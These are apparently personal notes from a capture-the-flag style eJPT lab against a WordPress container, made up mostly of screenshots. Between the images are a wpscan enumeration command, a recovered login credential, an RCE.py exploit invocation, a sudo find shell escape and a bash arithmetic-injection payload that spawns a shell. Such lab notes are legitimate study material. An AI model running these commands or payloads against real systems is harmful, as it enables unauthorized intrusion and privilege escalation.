- ---
- Tags: #ejptmachine #debugfs #wordpress #reverseshell 
---

![Pasted image 20250206202859](../../Fotos/Pasted%20image%2020250206202859.png)

![Pasted image 20250206202911](../../Fotos/Pasted%20image%2020250206202911.png)

![Pasted image 20250206203044](../../Fotos/Pasted%20image%2020250206203044.png)

![Pasted image 20250206203037](../../Fotos/Pasted%20image%2020250206203037.png)

![Pasted image 20250206203111](../../Fotos/Pasted%20image%2020250206203111.png)

`wpscan --url http://172.18.0.2 --enumerate u`

![Pasted image 20250206203330](../../Fotos/Pasted%20image%2020250206203330.png)

![Pasted image 20250206203722](../../Fotos/Pasted%20image%2020250206203722.png)

![Pasted image 20250206203735](../../Fotos/Pasted%20image%2020250206203735.png)

- developer : 2wmy3KrGDRD%RsA7Ty5n71L^

![Pasted image 20250206203756](../../Fotos/Pasted%20image%2020250206203756.png)

![Pasted image 20250206204809](../../Fotos/Pasted%20image%2020250206204809.png)

![Pasted image 20250206205025](../../Fotos/Pasted%20image%2020250206205025.png)

`python3 RCE.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^`

![Pasted image 20250206205500](../../Fotos/Pasted%20image%2020250206205500.png)

![Pasted image 20250206205521](../../Fotos/Pasted%20image%2020250206205521.png)

![Pasted image 20250206210023](../../Fotos/Pasted%20image%2020250206210023.png)

![Pasted image 20250206210031](../../Fotos/Pasted%20image%2020250206210031.png)

![Pasted image 20250206210101](../../Fotos/Pasted%20image%2020250206210101.png)

`sudo -u rafa find . -exec /bin/sh \; -quit`

![Pasted image 20250206211058](../../Fotos/Pasted%20image%2020250206211058.png)

![Pasted image 20250206211702](../../Fotos/Pasted%20image%2020250206211702.png)

![Pasted image 20250206211833](../../Fotos/Pasted%20image%2020250206211833.png)

**`a[$(/bin/bash>&2)]`**

![Pasted image 20250206212717](../../Fotos/Pasted%20image%2020250206212717.png)

